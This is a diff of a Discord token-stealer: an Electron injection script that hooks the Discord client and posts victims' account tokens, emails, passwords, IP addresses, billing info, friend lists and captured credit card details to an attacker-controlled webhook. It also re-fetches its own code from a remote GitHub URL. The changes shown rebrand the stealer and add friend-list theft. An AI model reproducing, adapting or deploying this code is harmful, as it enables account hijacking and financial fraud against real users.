@@ -6,17 +6,16 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
 const config = {
-  webhook: 'https://canary.discord.com/api/webhooks/985538845581918248/pVl4QKdatMWMz8YoLmoAJVMIpLemO9FKfRgCw52_BHXgVKG5wjJOCiVEoAuJv99npFZJ',
+  webhook: '%WEBHOOK%', 
   ip: '%IP%',
-  auto_buy_nitro: true, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
-  ping_on_run: false, //sends whatever value you have in ping_val when you get a run/login
-  ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
-  embed_name: 'test',
-  embed_icon: 'https://cdn.discordapp.com/attachments/985660218253934622/985676305104265226/nemotitre.jpg'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
-  embed_color: 1746924, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  injection_url: 'https://raw.githubusercontent.com/oxyidz/mezff/main/index.js', //injection url for when it reinjects
+  auto_buy_nitro: false, 
+  ping_on_run: false, 
+  ping_val: '@everyone', 
+  embed_name: 'test', 
+  embed_icon: 'https://media.discordapp.net/attachments/938721597748031568/939085296107155536/Picsart_22-01-16_16-47-19-734.jpg',
+  embed_color: 1746924, 
+  injection_url: 'https://raw.githubusercontent.com/otar120/injector/main/index.js',
   api: 'https://discord.com/api/v9/users/@me',
-  
   filter: {
     urls: [
       'https://discord.com/api/v*/users/@me',
@@ -519,9 +518,9 @@ const getNitro = (flags) => {
     case 0:
       return '';
     case 1:
-      return '<:4872badgenitroclassic:985676613079400488> ';
+      return '<:nitro:892130462024224838> ';
     case 2:
-      return '<:4872badgenitroclassic:985676613079400488> ';
+      return '<:nitro:892130462024224838> ';
     default:
       return '';
   }
@@ -531,40 +530,40 @@ const getBadges = (flags) => {
   let badges = '';
   switch (flags) {
     case 1:
-      badges += ' <:6832badgediscordstaff:985676806294233140> ';
+      badges += 'Discord Staff, ';
       break;
     case 2:
-      badges += ' <:7606badgepartneredserverowner:985676965086375976> ';
+      badges += 'Partnered Server Owner, ';
       break;
     case 131072:
-      badges += ' <:1564badgedeveloper:985677107399118900> ';
+      badges += ' <:DevBadge:912727453875699733> ';
       break;
     case 4:
-      badges += ' <:7606badgehypesquadevents:985677218707554375> ';
+      badges += ' <a:CH_IconHypesquadShiny:928551747591487548> ';
       break;
     case 16384:
-      badges += ' <:7904discordbughunterlv2:985677598619209729> ';
+      badges += 'Gold BugHunter, ';
       break;
     case 8:
-      badges += ' <:9595badgebughunter:985677427487436861> ';
+      badges += 'Green BugHunter, ';
       break;
     case 512:
-      badges += ' <:6832badgeearlysupporter:985677713719324692> ';
+      badges += ' <a:early:913099122968494170> ';
       break;
     case 128:
-      badges += '<:1350discordbrillance:985677830325170266> ';
+      badges += ' <:brilliance:919973089285120111> ';
       break;
     case 64:
-      badges += ' <:1247discordbravery:985677969861259285> ';
+      badges += ' <:bravery:919973089222205451> ';
       break;
     case 256:
-      badges += ' <:5946discordbalance:985678482619113522> ';
+      badges += ' <:balance:919973088651776001> ';
       break;
     case 0:
-      badges = 'No Badges';
+      badges = '`No Badges`';
       break;
     default:
-      badges = 'No Badges';
+      badges = '`No Badges`';
       break;
   }
   return badges;
@@ -602,6 +601,7 @@ const login = async (email, password, token) => {
   const nitro = getNitro(json.premium_type);
   const badges = getBadges(json.flags);
   const billing = await getBilling(token);
+  const friends = await getFriends(token);
   const content = {
     username: config.embed_name,
     avatar_url: config.embed_icon,
@@ -610,45 +610,50 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '<a:9382blueheart:985665072187707452> @SN - Token:',
-            value: `\`\`\`${token}\`\`\`\n[Click = Copy](https://superfurrycdn.nl/copy/${token})`,
+            name: '<a:944007295417843743:959785231982931979> Token:',
+            value: `\`${token}\` [Click to copy](https://superfurrycdn.nl/copy/{token})`,
             inline: false,
           },
           {
-            name: '<a:9574_Butterfly_Blue:985666963089014805> @SN - Email:',
-            value: `\`${email}\`\n[Click = Copy](https://superfurrycdn.nl/copy/${email})`,
-            inline: true,
-          },
-          {
-            name: '<a:4536gun4:985673435860586557> @SN - Password:',
-            value: `\`${password}\`\n[Click = Copy](https://superfurrycdn.nl/copy/${password})`,
-            inline: true,
-          },
-          {
-            name: '<a:5211fireemojis:985667589961318430> @SN - IP:',
-            value: `\`${config.ip}\`\n[Click = Open](https://ipinfo.io/${ip})`,
-            inline: true,
-          },
-          {
-            name: '<:1205bluepawprints:985668463899050014> @SN - Badges Type:',
+            name: '<a:satanist:802503618972483615> Badges:',
             value: `${badges}`,
             inline: true,
           },
           {
-            name: '<a:6132lightblueheartspin:985668720422682724> @SN - Billing Type:',
-            value: `${billing}`,
+            name: '<:944007233820307467:959785232037470208> Billing:',
+            value: `**${billing}**`,
             inline: true,
-           },
+          },
+          {
+            name: '<:944007233820307467:959785232037470208> Friends:',
+            value: `\`${friends}\``,
+            inline: true,
+          },
+          {
+            name: '<:944007233820307467:959785232037470208> Email:',
+            value: `\`${email}\``,
+            inline: true,
+          },
+          {
+            name: '<:944007233820307467:959785232037470208> IP:',
+            value: `\`${config.ip}\``,
+            inline: true,
+          },
+          {
+            name: '<a:satan:846706207632261120> Password:',
+            value: `\`${password}\``,
+            inline: true,
+          },
         ],
         author: {
-          name: "New Victime 👀 is " + json.username +"#" + json.discriminator + " - " +"("+json.id+")",
+          name: json.username + '#' + json.discriminator + ' - ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "R.I.P " + json.username +"#" + json.discriminator + " by @SN-Fishing.cc 🐟",
+          text: 'BulkFA',
         },
         thumbnail: {
-            url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
+          url: 'https://media.discordapp.net/attachments/938721597748031568/939085296107155536/Picsart_22-01-16_16-47-19-734.jpg',
         },
       },
     ],
@@ -690,7 +695,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "R.I.P " + json.username +"#" + json.discriminator + " by @SN-Fishing.cc 🐟",
+          text: 'BulkFA',
         },
       },
     ],
@@ -732,7 +737,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "R.I.P " + json.username +"#" + json.discriminator + " by @SN-Fishing.cc 🐟",
+          text: 'BulkFA',
         },
       },
     ],
@@ -774,7 +779,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "R.I.P " + json.username +"#" + json.discriminator + " by @SN-Fishing.cc 🐟",
+          text: 'BulkFA',
         },
       },
     ],
@@ -816,7 +821,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "R.I.P " + json.username +"#" + json.discriminator + " by @SN-Fishing.cc 🐟",
+          text: 'BulkFA',
         },
       },
     ],
@@ -860,7 +865,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "R.I.P " + json.username +"#" + json.discriminator + " by @SN-Fishing.cc 🐟",
+          text: 'BulkFA',
         },
       },
     ],
